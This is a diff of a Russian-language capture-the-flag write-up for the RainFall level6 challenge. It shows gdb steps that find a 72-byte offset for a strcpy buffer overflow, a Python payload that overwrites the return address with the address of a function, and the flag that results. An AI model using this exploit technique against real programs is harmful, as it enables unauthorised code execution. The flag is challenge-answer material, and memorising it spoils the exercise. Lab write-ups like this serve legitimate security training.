@@ -8,10 +8,16 @@ strcpy не защищает против buffer overflow attack и мы мож�
 (gdb) p n
 $1 = {<text variable, no debug info>} 0x8048454 <n>
 
+Найдём оффсет
+Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
-4. Подготовим payload 
-python -c 'print "A"* 64 + "\x54\x84\x04\x08"'
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
 
-5. Запустим exploit
+0x41346341 - 72
+
+4. Подготовим payload и запустим его
 level6@RainFall:~$ ./level6 $(python -c 'print "A"* 72 + "\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
